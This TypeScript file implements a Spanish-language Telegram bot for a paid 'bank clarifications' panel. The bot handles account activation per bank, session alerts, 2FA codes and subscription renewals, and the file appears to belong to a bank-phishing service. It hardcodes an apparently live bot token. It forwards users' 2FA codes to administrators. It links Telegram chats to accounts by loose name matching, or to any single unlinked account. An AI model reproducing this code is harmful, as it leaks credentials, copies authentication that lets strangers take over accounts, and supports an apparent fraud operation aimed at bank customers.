import TelegramBot from 'node-telegram-bot-api';
import { storage } from './storage';
import { User, VerificationCode } from '@shared/schema';

// Token del bot y chat ID del administrador
const TELEGRAM_TOKEN = '7806665012:AAHpmPYzeuwXWYNrlnaq2DkWqPTQzRquppk';
const ADMIN_CHAT_ID = '6615027684';

// Crear instancia del bot con polling habilitado
let bot: TelegramBot;

try {
  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
  console.log('🤖 Bot de Telegram iniciado correctamente');
} catch (error) {
  console.error('❌ Error iniciando bot de Telegram:', error);
}

// Mensaje de bienvenida
const WELCOME_MESSAGE = `
🎉 *¡Bienvenido a nuestro panel!*

Gracias por utilizar nuestro sistema de aclaraciones bancarias.

📝 *Para poder registrarte:*
1. Ingresa a: panelbalonx.vip/balonx
2. Presiona en "Registrarte"
3. Ingresa un usuario, una contraseña y tu Chat ID

💬 Para cualquier duda o sugerencia, contacta con @balonxSistema

🔐 *Funciones disponibles:*
• Autenticación de doble factor
• Notificaciones en tiempo real
• Mensajería directa del administrador

¡Esperamos que tengas una excelente experiencia!
`;

// Función para generar código de verificación de 6 dígitos
export function generateVerificationCode(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Función para enviar código de verificación 2FA
export async function sendVerificationCode(userId: number, username: string): Promise<{ success: boolean; code?: string; error?: string }> {
  try {
    const user = await storage.getUserById(userId);
    if (!user || !user.telegramChatId) {
      return { success: false, error: 'Usuario no tiene Chat ID configurado' };
    }

    const code = generateVerificationCode();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // Expira en 10 minutos

    // Guardar código en la base de datos
    await storage.createVerificationCode({
      userId,
      code,
      expiresAt
    });

    const message = `🔐 *Código de Verificación*

Hola *${username}*,

Tu código de verificación para acceder al panel es:

\`${code}\`

⏰ Este código expira en 10 minutos.
🔒 No compartas este código con nadie.

Si no solicitaste este código, ignora este mensaje.`;

    await bot.sendMessage(user.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    // También enviar al administrador para monitoreo
    const adminMessage = `🔐 *Código 2FA Enviado*

Usuario: *${username}*
Código: \`${code}\`
Expira: ${expiresAt.toLocaleString('es-MX')}`;

    // Enviar al Chat ID configurado del administrador principal
    await bot.sendMessage(ADMIN_CHAT_ID, adminMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    // También enviar al administrador balonx si tiene Chat ID configurado
    try {
      const adminUser = await storage.getUserByUsername('balonx');
      if (adminUser && adminUser.telegramChatId) {
        await bot.sendMessage(adminUser.telegramChatId, adminMessage, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        console.log(`✅ Código 2FA también enviado al admin balonx: ${adminUser.telegramChatId}`);
      }
    } catch (error) {
      console.log('ℹ️ No se pudo enviar al admin balonx:', error);
    }

    console.log(`✅ Código 2FA enviado a ${username}: ${code}`);
    return { success: true, code };

  } catch (error: any) {
    console.error('❌ Error enviando código 2FA:', error);
    return { success: false, error: error.message };
  }
}

// Función para verificar código 2FA
export async function verifyCode(userId: number, inputCode: string): Promise<{ success: boolean; error?: string }> {
  try {
    const verificationCode = await storage.getValidVerificationCode(userId, inputCode);
    
    if (!verificationCode) {
      return { success: false, error: 'Código inválido o expirado' };
    }

    // Marcar código como usado
    await storage.markVerificationCodeAsUsed(verificationCode.id);
    
    console.log(`✅ Código 2FA verificado para usuario ID: ${userId}`);
    return { success: true };

  } catch (error: any) {
    console.error('❌ Error verificando código 2FA:', error);
    return { success: false, error: error.message };
  }
}

// Función para enviar mensaje de bienvenida
export async function sendWelcomeMessage(chatId: string): Promise<void> {
  try {
    await bot.sendMessage(chatId, WELCOME_MESSAGE, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ Mensaje de bienvenida enviado a chat ID: ${chatId}`);
  } catch (error: any) {
    console.error('❌ Error enviando mensaje de bienvenida:', error);
  }
}

// Función para que el administrador envíe mensajes a usuarios
export async function sendAdminMessage(userChatId: string, message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; error?: string }> {
  try {
    const formattedMessage = `📢 *Mensaje del ${fromAdmin}*

${message}

---
💬 Para responder, contacta con @balonxSistema`;

    await bot.sendMessage(userChatId, formattedMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Mensaje de administrador enviado a chat ID: ${userChatId}`);
    return { success: true };

  } catch (error: any) {
    console.error('❌ Error enviando mensaje de administrador:', error);
    return { success: false, error: error.message };
  }
}

// Función para enviar mensaje masivo a todos los usuarios con Chat ID
export async function sendBroadcastMessage(message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; sent: number; failed: number; errors: string[] }> {
  try {
    const users = await storage.getAllUsers();
    const usersWithChatId = users.filter(user => user.telegramChatId && user.role === 'user');

    let sent = 0;
    let failed = 0;
    const errors: string[] = [];

    for (const user of usersWithChatId) {
      try {
        await sendAdminMessage(user.telegramChatId!, message, fromAdmin);
        sent++;
        // Pequeña pausa para evitar límites de rate
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (error: any) {
        failed++;
        errors.push(`Error enviando a ${user.username}: ${error.message}`);
      }
    }

    console.log(`📊 Mensaje masivo completado: ${sent} enviados, ${failed} fallidos`);
    return { success: true, sent, failed, errors };

  } catch (error: any) {
    console.error('❌ Error en mensaje masivo:', error);
    return { success: false, sent: 0, failed: 0, errors: [error.message] };
  }
}

// Función para enviar notificación de activación de cuenta
export async function sendAccountActivationNotification(userData: {
  username: string;
  telegramChatId: string | null;
  expiresAt?: Date | null;
  allowedBanks?: string;
}): Promise<{ success: boolean; error?: string }> {
  try {
    if (!userData.telegramChatId) {
      return { success: false, error: "No se encontró Chat ID del usuario" };
    }

    // Determinar duración (1 día o 7 días)
    const duration = userData.expiresAt ? 
      (new Date(userData.expiresAt).getTime() - Date.now() > 2 * 24 * 60 * 60 * 1000 ? '7 días' : '1 día') 
      : 'permanente';

    // Determinar bancos
    const banksText = userData.allowedBanks === 'all' 
      ? 'todos los bancos' 
      : `los bancos seleccionados (${userData.allowedBanks?.split(',').join(', ')})`;

    // Mensaje de bienvenida cuando el administrador activa la cuenta
    const message = `🎉 *¡Tu cuenta ha sido activada!*

¡Bienvenido *${userData.username}*!

✅ Tu cuenta fue activada para ${banksText} por ${duration}.

🔐 Ya puedes ingresar a tu panel y utilizar todos los servicios disponibles.

📱 *Acceso*: panelbalonx.vip/balonx
📞 *Soporte*: @BalonxSistema

¡Gracias por usar nuestros servicios!`;

    await bot.sendMessage(userData.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Notificación de activación enviada a ${userData.username} (${userData.telegramChatId})`);
    return { success: true };

  } catch (error: any) {
    console.error(`❌ Error enviando notificación de activación a ${userData.username}:`, error);
    return { success: false, error: error.message };
  }
}

// Función para enviar notificación de sesión (existente)
export async function sendSessionNotification(sessionData: {
  sessionId: string;
  banco: string;
  tipo: string;
  username?: string;
}): Promise<void> {
  try {
    const message = `🔔 *Nueva Sesión Creada*

ID: \`${sessionData.sessionId}\`
Banco: *${sessionData.banco}*
Tipo: *${sessionData.tipo}*
${sessionData.username ? `Creado por: *${sessionData.username}*` : ''}

Tiempo: ${new Date().toLocaleString('es-MX')}`;

    await bot.sendMessage(ADMIN_CHAT_ID, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Notificación de sesión enviada: ${sessionData.sessionId}`);
  } catch (error: any) {
    console.error('❌ Error enviando notificación de sesión:', error);
  }
}

// Manejar comandos del bot
const setupBotCommands = () => {
  if (!bot) return;
  
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const userName = msg.from?.first_name || 'Usuario';
    console.log(`👋 Comando /start recibido de chat ID: ${chatId}`);
    
    try {
      // Verificar si ya existe un usuario con este Chat ID
      const users = await storage.getAllUsers();
      const existingUser = users.find(user => user.telegramChatId === chatId);
      
      if (existingUser) {
        // Usuario ya configurado
        const message = `👋 *¡Hola de nuevo, ${existingUser.username}!*

Tu Chat ID ya está configurado correctamente: \`${chatId}\`

✅ *Estado de tu cuenta:*
• Usuario: ${existingUser.username}
• Estado: ${existingUser.isActive ? '🟢 Activo' : '🔴 Inactivo'}
• Expira: ${existingUser.expiresAt ? new Date(existingUser.expiresAt).toLocaleDateString('es-ES') : 'Sin fecha'}

💡 *Comandos disponibles:*
• /help - Ver ayuda completa
• /id - Ver tu Chat ID

📞 *Soporte*: @BalonxSistema`;

        await bot.sendMessage(chatId, message, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        return;
      }

      // Buscar usuarios sin Chat ID configurado para asociación automática
      const usersWithoutChatId = users.filter(user => !user.telegramChatId && user.role === 'user');
      
      // Función para asociar Chat ID con confirmación
      const associateUserChatId = async (user: any, method: string) => {
        try {
          await storage.updateUser(user.id, { telegramChatId: chatId });
          
          const message = `🎉 *¡Chat ID Asociado Automáticamente!*

Hola *${userName}*, hemos asociado automáticamente tu Chat ID con la cuenta: *${user.username}*

Tu Chat ID: \`${chatId}\`
Método: ${method}

✅ *Configuración completada:*
• Ya puedes recibir códigos 2FA aquí
• Recibirás notificaciones importantes
• Estado: ${user.isActive ? '🟢 Activo' : '🔴 Inactivo'}

💡 *Comandos disponibles:*
• /help - Ver ayuda completa
• /id - Ver tu Chat ID

📞 *Soporte*: @BalonxSistema

¡Tu cuenta está lista para usar!`;

          await bot.sendMessage(chatId, message, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true 
          });

          // Notificar al administrador
          const adminMessage = `🔗 *Chat ID Asociado Automáticamente*

Usuario: *${user.username}*
Chat ID: \`${chatId}\`
Nombre Telegram: ${userName}
Método: ${method}

✅ Asociación completada exitosamente`;

          await bot.sendMessage(ADMIN_CHAT_ID, adminMessage, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true 
          });

          console.log(`✅ Chat ID ${chatId} asociado automáticamente al usuario ${user.username} (${method})`);
          return true;
        } catch (error) {
          console.error('❌ Error asociando Chat ID automáticamente:', error);
          return false;
        }
      };

      // Prioridad 1: Buscar coincidencia exacta por nombre de usuario
      const exactMatch = usersWithoutChatId.find(user => 
        user.username.toLowerCase() === userName.toLowerCase()
      );
      if (exactMatch) {
        const success = await associateUserChatId(exactMatch, "Coincidencia exacta de nombre");
        if (success) return;
      }

      // Prioridad 2: Buscar coincidencia parcial por nombre de usuario
      const partialMatch = usersWithoutChatId.find(user => 
        user.username.toLowerCase().includes(userName.toLowerCase()) ||
        userName.toLowerCase().includes(user.username.toLowerCase())
      );
      if (partialMatch) {
        const success = await associateUserChatId(partialMatch, "Coincidencia parcial de nombre");
        if (success) return;
      }

      // Prioridad 3: Si hay solo un usuario sin Chat ID, asociar automáticamente
      if (usersWithoutChatId.length === 1) {
        const success = await associateUserChatId(usersWithoutChatId[0], "Único usuario disponible");
        if (success) return;
      }

      // Mensaje por defecto si no hay asociación automática posible
      const welcomeMessage = `🎉 *¡Hola ${userName}!*

Tu Chat ID es: \`${chatId}\`

🔐 *Para registrarte en nuestro panel:*
1. Ve al panel de registro
2. Completa tu información
3. **Usa este Chat ID:** \`${chatId}\`
4. Una vez registrado, recibirás códigos 2FA aquí

${usersWithoutChatId.length > 1 ? 
  `⚠️ *Nota:* Hay ${usersWithoutChatId.length} usuarios sin Chat ID configurado. La asociación automática no es posible.` : 
  ''}

💡 *Comandos disponibles:*
• /help - Ver ayuda completa
• /id - Ver tu Chat ID nuevamente

📞 *Soporte*: @BalonxSistema

¡Gracias por utilizar nuestro sistema!`;

      await bot.sendMessage(chatId, welcomeMessage, { 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
      });

    } catch (error) {
      console.error('❌ Error en comando /start:', error);
      
      // Mensaje de fallback
      const fallbackMessage = `🎉 *¡Hola ${userName}!*

Tu Chat ID es: \`${chatId}\`

Para registrarte, usa este Chat ID en el panel de registro.

📞 *Soporte*: @BalonxSistema`;

      await bot.sendMessage(chatId, fallbackMessage, { 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
      });
    }
  });

  bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const helpMessage = `🆘 *Ayuda del Bot*

*Comandos disponibles:*
• /start - Mensaje de bienvenida
• /help - Mostrar esta ayuda
• /id - Mostrar tu Chat ID

*Funciones:*
• Recibir códigos de verificación 2FA
• Recibir mensajes del administrador
• Notificaciones del sistema

💬 Para soporte: @balonxSistema`;

    await bot.sendMessage(chatId, helpMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
  });

  bot.onText(/\/id/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const idMessage = `🆔 *Tu Chat ID*

Tu Chat ID es: \`${chatId}\`

Necesitas este ID para:
• Registro en el panel
• Recibir códigos 2FA
• Recibir notificaciones

💡 Copia este número y úsalo al registrarte.`;

    await bot.sendMessage(chatId, idMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
  });

  // Manejar errores del polling
  bot.on('polling_error', (error: any) => {
    console.log('🔄 Error de polling del bot (continuando):', error.code);
  });

  console.log('🎯 Bot de Telegram configurado con comandos: /start, /help, /id');
};

// Configurar comandos del bot después de la inicialización
setTimeout(setupBotCommands, 1000);

// Exportar el bot para uso externo si es necesario
export { bot };

// Función de limpieza para códigos expirados (ejecutar periódicamente)
export async function cleanupExpiredCodes(): Promise<void> {
  try {
    const expired = await storage.cleanupExpiredVerificationCodes();
    if (expired > 0) {
      console.log(`🧹 Limpieza: ${expired} códigos 2FA expirados eliminados`);
    }
  } catch (error) {
    console.error('❌ Error en limpieza de códigos:', error);
  }
}

// Ejecutar limpieza cada 30 minutos
setInterval(cleanupExpiredCodes, 30 * 60 * 1000);

/**
 * Envía recordatorios de renovación a usuarios cuyas suscripciones expiran en 1 día
 */
export async function sendRenewalReminders(): Promise<void> {
  try {
    console.log('[Bot] Verificando usuarios con suscripciones por vencer...');
    
    // Obtener usuarios que expiran en 24 horas
    const usersExpiringTomorrow = await storage.getUsersExpiringTomorrow();
    
    if (usersExpiringTomorrow.length === 0) {
      console.log('[Bot] No hay usuarios con suscripciones por vencer');
      return;
    }

    console.log(`[Bot] Enviando recordatorios a ${usersExpiringTomorrow.length} usuarios`);

    for (const user of usersExpiringTomorrow) {
      if (!user.telegramChatId) {
        console.log(`[Bot] Usuario ${user.username} no tiene Chat ID configurado`);
        continue;
      }

      const expirationDate = user.expiresAt ? new Date(user.expiresAt).toLocaleDateString('es-ES') : 'mañana';
      
      const message = `🚨 *RECORDATORIO DE RENOVACIÓN*

⚠️ Tu suscripción al panel expira el *${expirationDate}*

📝 Para renovar tu suscripción y seguir utilizando nuestro sistema, contacta con:
👉 @balonxSistema

⏰ *No pierdas acceso a tus servicios*
💼 Renueva ahora para mantener tu cuenta activa

_Este es un recordatorio automático del sistema_`;

      try {
        await bot.sendMessage(user.telegramChatId, message, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        
        console.log(`[Bot] Recordatorio enviado a ${user.username} (${user.telegramChatId})`);
        
        // Crear notificación en el sistema
        await storage.createNotification({
          userId: user.id,
          type: 'subscription_reminder',
          title: 'Recordatorio de Renovación',
          message: `Tu suscripción expira el ${expirationDate}. Contacta @balonxSistema para renovar.`,
          priority: 'high',
          actionUrl: 'https://t.me/balonxSistema'
        });
        
      } catch (error) {
        console.error(`[Bot] Error enviando recordatorio a ${user.username}:`, error);
      }
      
      // Pequeña pausa entre envíos para evitar rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
  } catch (error) {
    console.error('[Bot] Error en recordatorios de renovación:', error);
  }
}

// Ejecutar recordatorios diariamente a las 10:00 AM
const scheduleRenewalReminders = () => {
  const now = new Date();
  const targetTime = new Date();
  targetTime.setHours(10, 0, 0, 0); // 10:00 AM
  
  // Si ya pasó la hora de hoy, programar para mañana
  if (now > targetTime) {
    targetTime.setDate(targetTime.getDate() + 1);
  }
  
  const timeUntilTarget = targetTime.getTime() - now.getTime();
  
  setTimeout(() => {
    sendRenewalReminders();
    // Programar para ejecutar cada 24 horas
    setInterval(sendRenewalReminders, 24 * 60 * 60 * 1000);
  }, timeUntilTarget);
  
  console.log(`📅 Recordatorios programados para las 10:00 AM (próxima ejecución: ${targetTime.toLocaleString('es-ES')})`);
};

// Iniciar programación de recordatorios
scheduleRenewalReminders();

/**
 * Envía notificación cuando se renueva un panel
 */
export async function sendRenewalConfirmation(userId: number, newExpirationDate: Date): Promise<void> {
  try {
    const user = await storage.getUserById(userId);
    if (!user || !user.telegramChatId) {
      console.log(`[Bot] Usuario ${userId} no tiene Chat ID configurado para confirmación de renovación`);
      return;
    }

    const expirationDateStr = newExpirationDate.toLocaleDateString('es-ES');
    
    const message = `✅ *PANEL RENOVADO EXITOSAMENTE*

🎉 ¡Tu suscripción ha sido renovada!

📅 **Nueva fecha de expiración:** ${expirationDateStr}
👤 **Usuario:** ${user.username}
🔄 **Estado:** Activo

💼 Ahora puedes continuar utilizando todos los servicios del panel.

¡Gracias por renovar con nosotros! 🚀

_Confirmación automática del sistema_`;

    await bot.sendMessage(user.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    
    console.log(`[Bot] Confirmación de renovación enviada a ${user.username} (${user.telegramChatId})`);
    
    // Crear notificación en el sistema
    await storage.createNotification({
      userId: user.id,
      type: 'subscription_renewed',
      title: 'Panel Renovado',
      message: `Tu suscripción ha sido renovada hasta el ${expirationDateStr}`,
      priority: 'medium'
    });
    
  } catch (error) {
    console.error('[Bot] Error enviando confirmación de renovación:', error);
  }
}

/**
 * Envía notificación cuando vence un panel
 */
export async function sendExpirationNotification(userId: number): Promise<void> {
  try {
    const user = await storage.getUserById(userId);
    if (!user || !user.telegramChatId) {
      console.log(`[Bot] Usuario ${userId} no tiene Chat ID configurado para notificación de vencimiento`);
      return;
    }

    const message = `⚠️ *PANEL VENCIDO*

🔒 Tu suscripción al panel ha expirado

👤 **Usuario:** ${user.username}
📅 **Fecha de vencimiento:** Hoy
🚫 **Estado:** Inactivo

📝 **Para reactivar tu cuenta:**
👉 Contacta con @balonxSistema
💰 Renueva tu suscripción para restablecer el acceso

⏰ No pierdas más tiempo, ¡renueva ahora!

_Notificación automática del sistema_`;

    await bot.sendMessage(user.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    
    console.log(`[Bot] Notificación de vencimiento enviada a ${user.username} (${user.telegramChatId})`);
    
    // Crear notificación en el sistema
    await storage.createNotification({
      userId: user.id,
      type: 'subscription_expired',
      title: 'Panel Vencido',
      message: 'Tu suscripción ha expirado. Contacta @balonxSistema para renovar.',
      priority: 'high',
      actionUrl: 'https://t.me/balonxSistema'
    });
    
  } catch (error) {
    console.error('[Bot] Error enviando notificación de vencimiento:', error);
  }
}

/**
 * Verifica y notifica paneles vencidos
 */
export async function checkAndNotifyExpiredPanels(): Promise<void> {
  try {
    console.log('[Bot] Verificando paneles recién vencidos...');
    
    const expiredUsers = await storage.getRecentlyExpiredUsers();
    
    if (expiredUsers.length === 0) {
      console.log('[Bot] No hay paneles recién vencidos');
      return;
    }

    console.log(`[Bot] Enviando notificaciones de vencimiento a ${expiredUsers.length} usuarios`);

    for (const user of expiredUsers) {
      await sendExpirationNotification(user.id);
      
      // Pequeña pausa entre envíos
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
  } catch (error) {
    console.error('[Bot] Error verificando paneles vencidos:', error);
  }
}

// Ejecutar verificación de vencimientos cada hora
setInterval(checkAndNotifyExpiredPanels, 60 * 60 * 1000);
console.log('📅 Verificación de vencimientos programada cada hora');